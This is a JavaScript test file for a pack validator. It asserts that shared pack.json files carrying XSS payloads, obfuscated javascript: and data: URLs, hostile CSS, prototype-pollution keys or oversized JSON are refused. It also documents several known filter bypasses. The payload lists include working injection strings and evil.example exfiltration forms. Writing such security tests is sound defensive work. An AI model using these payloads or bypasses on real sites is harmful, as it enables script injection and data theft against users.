// QA: hostile pack.json files (SPEC §9 "data only", §13.2, §13.3). A pack comes from a file someone
// shared or a card's lorebook, so every trick that turns data into code must be refused by
// validatePack: script and other code-running tags, on* attributes, javascript:/vbscript:/data:
// document URLs hidden behind entities, whitespace or case, SVG, CSS loading or running anything,
// prototype-pollution keys, and JSON too big, too deep or not plain. Problems found are the
// test.todo entries at the end, named after what should happen.
import test from 'node:test';
import assert from 'node:assert/strict';
import { validatePack } from '../../../src/v2/packs/validate.js';
import { LIMITS } from '../../../src/v2/packs/limits.js';

const base = (extra = {}) => ({ id: 'evil', version: '1.0.0', requires: { storyBlock: '^2' }, content: {}, ...extra });
const withNote = note => base({ content: { items: [{ name: 'Lure', note }] } });
const withScreen = screen => base({ screens: [{ id: 'evil-board', mounts: ['tab'], template: '<div>ok</div>', ...screen }] });

function refused(input, why) {
    const result = validatePack(input);
    assert.equal(result.ok, false, `${why}: the pack must be refused, it was accepted`);
    assert.ok(result.errors.length >= 1);
    for (const error of result.errors) {
        assert.equal(typeof error.code, 'string');
        assert.equal(typeof error.message, 'string');
    }
    return result.errors;
}

test('sanity: the base pack and a plain item note are accepted', () => {
    assert.equal(validatePack(base()).ok, true);
    assert.equal(validatePack(withNote('A violet lure, slightly <worn> & bent.')).ok, true);
    assert.equal(validatePack(withScreen({ css: '.board { color: red; background: url(https://example.com/a.png); }' })).ok, true);
});

const SCRIPT_TAGS = [
    '<script>alert(1)</script>',
    '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
    '<scr<script>ipt>alert(1)</script>',
    '< script >alert(1)</script>',
    '<script\n>alert(1)</script>',
    '</script><script>alert(1)</script>',
    '<iframe src="https://evil.example"></iframe>',
    '<iframe/srcdoc="<b>x</b>">',
    '<object data="x.swf"></object>',
    '<embed src="x.swf">',
    '<applet code="x">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<base href="https://evil.example/">',
    '<style>body{display:none}</style>',
    '<frameset><frame src="x">',
    '<form action="https://evil.example/steal"><input name=a></form>',
    '<form method=post\n action=https://evil.example>',
];

const EVENT_ATTRS = [
    '<img src=x onerror=alert(1)>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<img src=x onerror =alert(1)>',
    '<img src=x onerror\n=alert(1)>',
    '<img/src/onerror=alert(1)>',
    '<img src="x"onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<body onpageshow=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<x \u000bonclick=alert(1)>',
    '<img src=x\fonerror=alert(1)>',
    '<a onmouseover="alert(1)">hover</a>',
    '<marquee onstart=alert(1)>',
];

const SCRIPT_URLS = [
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href="  javascript:alert(1)">x</a>',
    '<a href="java\tscript:alert(1)">x</a>',
    '<a href="java\nscript:alert(1)">x</a>',
    '<a href="java\u0000script:alert(1)">x</a>',
    '<a href="jav&#x09;ascript:alert(1)">x</a>',
    '<a href="jav&#X09;ascript:alert(1)">x</a>',
    '<a href="jav&#9;ascript:alert(1)">x</a>',
    '<a href="&#106;&#97;vascript:alert(1)">x</a>',
    '<a href="&#0000106;avascript:alert(1)">x</a>',
    '<a href="&#x6A&#x61vascript:alert(1)">x</a>',
    '<a href="javascript&colon;alert(1)">x</a>',
    '<a href="javascript&#58;alert(1)">x</a>',
    '<a href="java&Tab;script:alert(1)">x</a>',
    '<a href="java&NewLine;script:alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="livescript:alert(1)">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<a href="DATA:TEXT/HTML;base64,PHNjcmlwdD4=">x</a>',
    '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
    '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
    '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
    '<svg><use href="data:image/svg+xml,<svg id=x></svg>#x"/></svg>',
];

for (const [group, list] of [['code-running tag', SCRIPT_TAGS], ['event attribute', EVENT_ATTRS], ['script URL', SCRIPT_URLS]]) {
    test(`a ${group} anywhere in a pack's text is refused (${list.length} variants, 4 places each)`, () => {
        for (const payload of list) {
            refused(withNote(payload), `item note ${JSON.stringify(payload)}`);
            refused(base({ description: payload }), `description ${JSON.stringify(payload)}`);
            refused(withScreen({ template: `<div>${payload}</div>` }), `screen template ${JSON.stringify(payload)}`);
            refused(base({ content: { creatures: [{ name: 'Rat', [`lore`]: { text: [payload] } }] } }), `nested creature text ${JSON.stringify(payload)}`);
        }
    });
}

test('a field name can carry markup too: refused', () => {
    refused(base({ content: { creatures: [{ name: 'Rat', '<img src=x onerror=alert(1)>': 1 }] } }), 'markup in a key');
});

test('image and link fields take only https or a raster data: image', () => {
    for (const bad of ['http://example.com/a.png', '//evil.example/a.png', 'javascript:alert(1)', 'data:image/svg+xml;base64,PHN2Zz4=',
        'data:text/html;base64,PGI+', 'https://exa mple.com/a.png', 'file:///etc/passwd', 'blob:https://x/1', '/relative.png', ' javascript:1']) {
        refused(base({ content: { creatures: [{ name: 'Rat', image: bad }] } }), `image ${bad}`);
        refused(base({ content: { creatures: [{ name: 'Rat', href: bad }] } }), `href ${bad}`);
    }
    assert.equal(validatePack(base({ content: { creatures: [{ name: 'Rat', image: 'https://example.com/rat.png' }] } })).ok, true);
    assert.equal(validatePack(base({ content: { creatures: [{ name: 'Rat', image: 'data:image/png;base64,iVBORw0KGgo=' }] } })).ok, true);
});

const BAD_CSS = [
    '@import url(https://evil.example/x.css);',
    '@IMPORT "https://evil.example/x.css";',
    '@\\69mport "x.css";',
    '.a { background: url(javascript:alert(1)); }',
    '.a { background: url("javascript:alert(1)"); }',
    '.a { background: url( \'http://evil.example/a.png\' ); }',
    '.a { background: URL(http://evil.example/a.png); }',
    '.a { background: url(//evil.example/a.png); }',
    '.a { background: url(data:image/svg+xml;base64,PHN2Zz4=); }',
    '.a { background: url(data:text/html,<b>x</b>); }',
    '.a { width: expression(alert(1)); }',
    '.a { width: EXPRESSION (alert(1)); }',
    '.a { behavior: url(x.htc); }',
    '.a { -moz-binding: url(https://evil.example/x.xml#x); }',
    '.a { background: u\\72l(http://evil.example); }',
    '</style><script>alert(1)</script>',
    '.a { content: "\\3c script\\3e"; }',
];

test('screen CSS that loads, runs or escapes anything is refused', () => {
    for (const css of BAD_CSS) refused(withScreen({ css }), `css ${JSON.stringify(css)}`);
});

test('theme values are plain CSS values: no url(), expression(), braces, semicolons or backslashes', () => {
    for (const value of ['url(https://evil.example/a.png)', 'expression(alert(1))', 'red; } body { display: none', 'red}', '\\75rl(x)', '<b>', '@import x']) {
        refused(base({ theme: { '--ss-accent': value } }), `theme ${JSON.stringify(value)}`);
        refused(withScreen({ theme: { '--ss-accent': value } }), `screen theme ${JSON.stringify(value)}`);
    }
    for (const name of ['color', '--', '-x', '--X', '--a;b', 'background']) refused(base({ theme: { [name]: 'red' } }), `theme name ${name}`);
});

test('prototype-pollution keys are refused wherever they are, and nothing is polluted', () => {
    const texts = [
        '{"id":"evil","version":"1.0.0","requires":{"storyBlock":"^2"},"__proto__":{"polluted":1}}',
        '{"id":"evil","version":"1.0.0","requires":{"storyBlock":"^2"},"content":{"items":[{"name":"x","__proto__":{"polluted":1}}]}}',
        '{"id":"evil","version":"1.0.0","requires":{"storyBlock":"^2"},"content":{"items":[{"name":"x","stats":{"constructor":{"prototype":{"polluted":1}}}}]}}',
        '{"id":"evil","version":"1.0.0","requires":{"storyBlock":"^2"},"start":{"inventory":{"prototype":1}}}',
        '{"id":"evil","version":"1.0.0","requires":{"storyBlock":"^2"},"theme":{"__proto__":{"--x":"red"}}}',
    ];
    for (const text of texts) {
        refused(text, `text ${text}`);
        refused(JSON.parse(text), `parsed ${text}`);
    }
    assert.equal(({}).polluted, undefined);
    assert.equal(Object.prototype.polluted, undefined);
});

test('JSON that is huge, deep, wide or long is refused without a crash', () => {
    const deepText = `{"id":"evil","version":"1.0.0","requires":{"storyBlock":"^2"},"content":{"creatures":[{"name":"x","lore":${'['.repeat(20000)}${']'.repeat(20000)}}]}}`;
    refused(deepText, 'nesting 20000 deep (text)');
    let deep = {};
    const root = deep;
    for (let i = 0; i < 5000; i++) deep = (deep.x = {});
    refused(base({ content: { creatures: [{ name: 'x', lore: root }] } }), 'nesting 5000 deep (object)');
    refused('{"id":"evil","pad":"' + 'a'.repeat(LIMITS.packBytes) + '"}', 'larger than packBytes');
    refused(base({ description: 'a'.repeat(LIMITS.string + 1) }), 'a string longer than the limit');
    refused(base({ content: { creatures: [{ name: 'x', lore: Array.from({ length: LIMITS.array + 1 }, () => 1) }] } }), 'an array past the limit');
    refused(base({ content: { creatures: [{ name: 'x', lore: Object.fromEntries(Array.from({ length: LIMITS.keys + 1 }, (_, i) => [`k${i}`, 1])) }] } }), 'an object with too many keys');
    refused(base({ content: { creatures: [{ name: 'x', [`k${'y'.repeat(LIMITS.name + 1)}`]: 1 }] } }), 'a field name longer than the limit');
    // Multi-byte text counts in bytes, not characters.
    refused('{"id":"evil","pad":"' + '\u{1F600}'.repeat(Math.ceil(LIMITS.packBytes / 4) + 10) + '"}', 'larger than packBytes in UTF-8');
});

test('values JSON cannot hold are refused when the pack is given as an object', () => {
    const cyclic = base();
    cyclic.content = { creatures: [{ name: 'x' }] };
    cyclic.content.creatures[0].self = cyclic.content.creatures[0];
    const getter = base();
    Object.defineProperty(getter, 'description', { enumerable: true, get() { throw new Error('a getter ran'); } });
    class Fancy { constructor() { this.name = 'x'; } }
    const cases = [
        ['NaN', base({ content: { items: [{ name: 'x', value: NaN }] } })],
        ['Infinity', base({ content: { items: [{ name: 'x', value: Infinity }] } })],
        ['a function', base({ content: { items: [{ name: 'x', note: () => 'x' }] } })],
        ['undefined', base({ content: { items: [{ name: 'x', note: undefined }] } })],
        ['a symbol value', base({ content: { items: [{ name: 'x', note: Symbol('x') }] } })],
        ['a symbol key', base({ content: { items: [{ name: 'x', [Symbol('k')]: 1 }] } })],
        ['a bigint', base({ content: { items: [{ name: 'x', value: 10n }] } })],
        ['a Date', base({ content: { items: [{ name: 'x', note: new Date(0) }] } })],
        ['a Map', base({ content: { items: [{ name: 'x', stats: new Map([['a', 1]]) }] } })],
        ['a class instance', base({ content: { items: [new Fancy()] } })],
        ['a cycle', cyclic],
        ['a getter', getter],
    ];
    for (const [what, value] of cases) refused(value, what);
});

test('not a pack at all: refused with a plain reason', () => {
    for (const input of ['', '   ', '﻿', 'null', '[]', '"pack"', '42', '{', '{"id":', 'NaN', '{"id":"evil",}', '<script>alert(1)</script>']) {
        refused(input, `input ${JSON.stringify(input)}`);
    }
});

test('a pack event runs only command names, never code', () => {
    const event = then => base({ content: { events: [{ id: 'boom', when: 'true', cue: 'Boom.', then }] } });
    for (const command of ['alert(1)', 'inventory.grant;alert(1)', '__proto__.x', 'x.__proto__', 'a', 'Inventory.Grant', '../x.y']) {
        refused(event([{ command, payload: {} }]), `then command ${command}`);
    }
});

// ---- problems found (each a failing check, kept as a todo so CI stays green) -----------------

const accepted = input => validatePack(input).ok === true;

test('packs/safety.js EVENT_ATTR: an event attribute after a quoted ">" (<img alt=">" src=x onerror=alert(1)>) is refused', () => {
    // EVENT_ATTR is /<[a-z][^>]*?[\s"'/]on[a-z]+\s*=(?!=)/: [^>] stops at the ">" inside the quoted alt
    // value, so the onerror that follows is never seen. A browser parses alt=">" as one attribute and
    // runs onerror. The template sanitiser (view/template) drops it when the text is drawn as a template;
    // this is the second wall, and it promises "no on* attributes" for every string of a pack.
    assert.equal(accepted(withNote('<img alt=">" src=x onerror=alert(1)>')), false);
    assert.equal(accepted(withNote('<img alt=\'>\' src=x onerror=alert(1)>')), false);
    assert.equal(accepted(withScreen({ template: '<div><img title="a>b" src=x onerror=alert(1)></div>' })), false);
});

test('packs/validate.js unsafeCss: image-set() and -webkit-image-set() may load only https or image data URLs', () => {
    // CSS_URL only looks inside url(); image-set("http://…" 1x) loads a URL without url().
    assert.equal(accepted(withScreen({ css: '.a { background-image: image-set("http://evil.example/a.png" 1x); }' })), false);
    assert.equal(accepted(withScreen({ css: '.a { background-image: -webkit-image-set("//evil.example/a.png" 1x); }' })), false);
    assert.equal(accepted(base({ theme: { '--ss-bg': 'image-set("http://evil.example/a.png" 1x)' } })), false);
});

test('packs/safety.js CODE_SCHEME: a link to a data: document (data:application/xhtml+xml, data:text/xml) is refused', () => {
    assert.equal(accepted(withNote('<a href="data:application/xhtml+xml;base64,PHNjcmlwdD4=">x</a>')), false);
    assert.equal(accepted(withScreen({ template: '<a href="data:text/xml,<x/>">x</a>' })), false);
});

test('packs/validate.js checkEvent: a pack event cannot run host-internal commands (module.init.*, capture.*)', () => {
    // COMMAND accepts "module.init.story-block" (wipes the inventory and scene when run) and
    // "capture.coin" (a change line the story never wrote).
    const event = command => base({ content: { events: [{ id: 'boom', when: 'true', cue: 'Boom.', then: [{ command, payload: {} }] }] } });
    assert.equal(accepted(event('module.init.story-block')), false);
    assert.equal(accepted(event('capture.coin')), false);
});
